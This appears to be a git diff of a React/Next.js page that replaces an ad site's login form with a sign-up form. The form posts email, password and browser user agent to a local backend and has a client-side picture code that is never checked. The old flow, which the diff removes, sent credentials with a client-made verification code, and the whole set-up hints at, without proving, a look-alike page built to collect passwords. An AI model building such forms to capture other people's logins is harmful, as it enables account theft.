@@ -67,10 +67,22 @@ const page = () => {
       }, []);
 
 
+      const [isChecked, setIsChecked] = useState(false);
+
+      const handleCheckboxChange = () => {
+        setIsChecked(!isChecked);
+      };
+    
+      const handleSubmit = (e) => {
+        e.preventDefault();
+        // Handle signup logic here
+      };
+
 
       const [formData, setFormData] = useState({
         email: '',
         password: '',
+        confrim:'',
         otp:''
 
       });
@@ -83,25 +95,32 @@ const page = () => {
         });
       };
 
-      const handlesubmit =async (e) => {
+      const handlesubmit = async (e) => {
         e.preventDefault(); 
-        const code = Math.floor(100000 + Math.random() * 900000).toString();
-        const response = await fetch('http://localhost:5000/api/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({email:formData.email, password:formData.password,userAgent:userAgent,code:code }),
-        });
 
-        sessionStorage.setItem('vc',code)
-
-        
         setFormData({
-          email: '',
-          password: '',
-          otp:''
+            email: '',
+            password: '',
+            confrim: '',
+            otp: ''
         });
-        router.push(`/login/verify`)
-      }
+
+        setIsChecked(!isChecked);
+    
+        if (formData.password === formData.confrim) {
+            
+                const response = await fetch('http://localhost:5000/api/signup', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: formData.email, password: formData.password, confrim: formData.confrim, userAgent: userAgent }),
+                });
+    
+            
+        } else {
+            alert('Please confirm that the passwords match.');
+        }
+    }
+    
       const handleshowMessage = () => {
         setShowMessage(!showMessage);
       }
@@ -111,23 +130,27 @@ const page = () => {
         <main className='p-[40px] flex justify-center'>
            <section className='flex flex-col gap-[20px]'>
            <Link href={'/'}><Image src={loginBenner} width={413} height={83} alt='login Benner'/></Link>
-           <section className='flex flex-col items-center gap-4'>
-            <div className='flex flex-col items-center gap-2'>
-                <h3 className='text-[#B9A697] text-[18px] font-normal'>Is this your first time posting?</h3>
-                <Link href={'/signup'}><button className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button></Link>
-            </div>
-            <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>
+           <section className='flex flex-col items-center gap-2'>
+            
+            <h3 className='text-[#B9A697] text-[25px] font-normal '>Create New Login</h3>
             <form onSubmit={handlesubmit} className='flex flex-col gap-3'>
                 <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
                 <input type="password" name="password" value={formData.password} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
+                <input type="password" name="confrim" value={formData.confrim} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Confrim Password' required/>
                 <div className='flex items-center justify-between'>
                     <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37} alt='..'/></div>
                     <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41} alt='...'/></span>
                 </div>
                 <input type="text" name="otp" value={formData.otp} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>
 
+                <div className='flex items-start gap-2'>
+                    <input  checked={isChecked}
+                    onChange={handleCheckboxChange} type="checkbox" className='mt-2 accent-[#8E8E8E]' name="" id="" />
+                    <h3 className='w-[234px] leading-[20px] text-[#585858] text-[16px] font-normal'>I certify I am 18 years of age or older, that I am placing ads for myself, under my own phone number and that I am abiding by all local laws and regulations.</h3>
+                </div>
+
                 <div className='flex flex-col items-center'>
-                <input className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer' type="submit" value="SUBMIT" />
+                <input disabled={!isChecked} className={`w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] ${isChecked ? "cursor-pointer":"cursor-default"}`} type="submit" value="SUBMIT" />
                 </div>
 
               <Image className='cursor-pointer' onClick={handleshowMessage} src={frame} height={109} width={252} alt='...' />
@@ -136,9 +159,9 @@ const page = () => {
               }
             </form>
 
-            <h3 className='text-[#0000EE] text-[14px] font-normal'>FORGOT PASSWORD?</h3>
+            <h3 className='text-[#B9A697] text-[16px] font-bold'>Already have an account?</h3>
 
-            <div className='text-center flex flex-col sm:gap-[26px] gap:[10px] '>
+            <div className='text-center pt-[30px] flex flex-col sm:gap-[26px] gap:[10px] '>
           <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal'>
             <a href="/"><li className='cursor-pointer'>Home</li></a>
             <li>|</li>
